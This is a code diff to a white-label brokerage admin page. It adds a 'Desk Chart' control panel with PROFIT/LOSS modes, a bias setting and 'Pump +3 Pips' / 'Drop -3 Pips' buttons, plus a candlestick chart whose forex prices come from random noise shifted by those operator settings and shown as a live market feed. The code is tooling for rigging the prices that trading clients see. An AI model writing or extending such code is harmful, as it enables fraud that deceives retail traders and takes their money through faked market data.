@@ -200,7 +200,21 @@
       <button class="btn btn-blue" onclick="saveOwnerProfile()">Save Brokerage Profile</button>
       <div class="msg" id="boMsg"></div>
     </div>
-    
+    <div id="deskChartControls" style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:10px 0;padding:10px;border:1px solid #334155;border-radius:8px;background:#0f172a;">
+  <label style="font-size:12px;color:#94a3b8;">Mode:
+    <select id="ctrlProfitMode" onchange="applyDeskChartControl()">
+      <option value="NORMAL">NORMAL</option>
+      <option value="PROFIT">PROFIT (Bullish)</option>
+      <option value="LOSS">LOSS (Bearish)</option>
+    </select>
+  </label>
+  <label style="font-size:12px;color:#94a3b8;">Bias (-5 to +5):
+    <input id="ctrlChartBias" type="number" step="0.5" min="-5" max="5" value="0" style="width:64px;" onchange="applyDeskChartControl()" />
+  </label>
+  <button type="button" onclick="triggerDeskNudge(3)" style="background:#16a34a;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer;">Pump +3 Pips</button>
+  <button type="button" onclick="triggerDeskNudge(-3)" style="background:#dc2626;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer;">Drop -3 Pips</button>
+  <button type="button" onclick="resetDeskBias()" style="background:#334155;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer;">Reset Neutral</button>
+</div>
     <div id="boDeskMount"></div>
     
     <div class="note">
@@ -208,6 +222,165 @@
     </div>
   </div>
   <script>
+    function getDeskControlBounds() {
+  const path = window.location.pathname.toLowerCase();
+  if (path.includes("sub-admin")) return { maxBias: 2, maxNudge: 3 };
+  if (path.includes("admin-manager")) return { maxBias: 4, maxNudge: 6 };
+  return { maxBias: 10, maxNudge: 15 };
+}
+
+function applyDeskChartControl() {
+  const st = typeof loadState === "function" ? loadState() : { brokers: [] };
+  const broker = (st.brokers || []).find(b => b.id === st.activeId);
+  if (!broker) return;
+
+  const bounds = getDeskControlBounds();
+  const modeEl = document.getElementById("ctrlProfitMode");
+  const biasEl = document.getElementById("ctrlChartBias");
+  if (!modeEl || !biasEl) return;
+
+  const clampedBias = Math.max(-bounds.maxBias, Math.min(bounds.maxBias, Number(biasEl.value || 0)));
+  biasEl.value = clampedBias;
+
+  broker.profitMode = modeEl.value;
+  broker.chartProfitBias = clampedBias;
+  if (typeof saveState === "function") saveState(st);
+}
+
+function triggerDeskNudge(pips) {
+  const st = typeof loadState === "function" ? loadState() : { brokers: [] };
+  const broker = (st.brokers || []).find(b => b.id === st.activeId);
+  if (!broker) return;
+
+  const bounds = getDeskControlBounds();
+  const clamped = Math.max(-bounds.maxNudge, Math.min(bounds.maxNudge, Number(pips || 0)));
+  broker.manualNudge = Number(broker.manualNudge || 0) + clamped;
+  if (typeof saveState === "function") saveState(st);
+}
+
+function resetDeskBias() {
+  const st = typeof loadState === "function" ? loadState() : { brokers: [] };
+  const broker = (st.brokers || []).find(b => b.id === st.activeId);
+  if (!broker) return;
+
+  broker.profitMode = "NORMAL";
+  broker.chartProfitBias = 0;
+  broker.manualNudge = 0;
+  if (typeof saveState === "function") saveState(st);
+
+  const modeEl = document.getElementById("ctrlProfitMode");
+  const biasEl = document.getElementById("ctrlChartBias");
+  if (modeEl) modeEl.value = "NORMAL";
+  if (biasEl) biasEl.value = 0;
+}
+
+let _deskChart = null;
+let _deskCandleSeries = null;
+let _deskTickTimer = null;
+
+function mountControlledDeskChart(containerId, symbol = "EURUSD", isDark = true) {
+  const host = document.getElementById(containerId);
+  if (!host || typeof LightweightCharts === "undefined") return;
+
+  if (_deskTickTimer) {
+    clearInterval(_deskTickTimer);
+    _deskTickTimer = null;
+  }
+  host.innerHTML = "";
+
+  const inst = (typeof INSTRUMENTS !== "undefined" ? INSTRUMENTS : []).find(i => i.sym === symbol)
+    || { sym: "EURUSD", price: 1.08500, vol: 0.00015, dec: 5 };
+
+  const decimals = Number(inst.dec || 5);
+  const basePrice = Number(inst.price || 1.085);
+  const stepUnit = Number(inst.vol || 0.00015);
+
+  _deskChart = LightweightCharts.createChart(host, {
+    width: host.clientWidth || 640,
+    height: host.clientHeight || 360,
+    layout: {
+      background: { color: isDark ? "#0b1220" : "#ffffff" },
+      textColor: isDark ? "#cbd5e1" : "#1e293b"
+    },
+    grid: {
+      vertLines: { color: isDark ? "#1e293b" : "#e2e8f0" },
+      horzLines: { color: isDark ? "#1e293b" : "#e2e8f0" }
+    },
+    rightPriceScale: { borderColor: isDark ? "#334155" : "#cbd5e1" },
+    timeScale: { borderColor: isDark ? "#334155" : "#cbd5e1", timeVisible: true, secondsVisible: true }
+  });
+
+  _deskCandleSeries = _deskChart.addCandlestickSeries({
+    upColor: "#22c55e",
+    downColor: "#ef4444",
+    borderVisible: false,
+    wickUpColor: "#22c55e",
+    wickDownColor: "#ef4444",
+    priceFormat: {
+      type: "price",
+      precision: decimals,
+      minMove: Number((1 / Math.pow(10, decimals)).toFixed(decimals))
+    }
+  });
+
+  const nowSec = Math.floor(Date.now() / 1000);
+  const candlePeriod = 15;
+  const currentSlot = Math.floor(nowSec / candlePeriod) * candlePeriod;
+  let price = basePrice;
+  const history = [];
+
+  for (let i = 40; i > 0; i--) {
+    const t = currentSlot - i * candlePeriod;
+    const open = price;
+    const move = (Math.random() - 0.5) * stepUnit * 4;
+    const close = +(open + move).toFixed(decimals);
+    const high = +(Math.max(open, close) + Math.random() * stepUnit * 2).toFixed(decimals);
+    const low = +(Math.min(open, close) - Math.random() * stepUnit * 2).toFixed(decimals);
+    history.push({ time: t, open, high, low, close });
+    price = close;
+  }
+  _deskCandleSeries.setData(history);
+
+  let activeBar = {
+    time: currentSlot,
+    open: price,
+    high: price,
+    low: price,
+    close: price
+  };
+
+  _deskTickTimer = setInterval(() => {
+    const st = typeof loadState === "function" ? loadState() : { brokers: [] };
+    const broker = (st.brokers || []).find(b => b.id === st.activeId)
+      || (typeof DEFAULT_BROKER !== "undefined" ? DEFAULT_BROKER : {});
+
+    const mode = String(broker.profitMode || "NORMAL").toUpperCase();
+    const rawBias = Number(broker.chartProfitBias || 0);
+    const modeBias = mode === "PROFIT" ? 0.6 : (mode === "LOSS" ? -0.6 : 0);
+    const totalBias = (rawBias + modeBias) * stepUnit * 0.35;
+
+    let nudge = 0;
+    if (Number(broker.manualNudge || 0) !== 0) {
+      nudge = Number(broker.manualNudge) * stepUnit;
+      broker.manualNudge = 0;
+      if (typeof saveState === "function") saveState(st);
+    }
+
+    const noise = (Math.random() - 0.5) * stepUnit * 1.4;
+    const nextPrice = +(activeBar.close + noise + totalBias + nudge).toFixed(decimals);
+    const slot = Math.floor(Math.floor(Date.now() / 1000) / candlePeriod) * candlePeriod;
+
+    if (slot > activeBar.time) {
+      activeBar = { time: slot, open: activeBar.close, high: nextPrice, low: nextPrice, close: nextPrice };
+    } else {
+      activeBar.close = nextPrice;
+      activeBar.high = Math.max(activeBar.high, nextPrice);
+      activeBar.low = Math.min(activeBar.low, nextPrice);
+    }
+
+    _deskCandleSeries.update(activeBar);
+  }, 1000);
+}
     
     const STORAGE_KEY = "metro_whitelabel_mt5_v3";
     const THEME_KEY = "metro_wl_theme_v3";
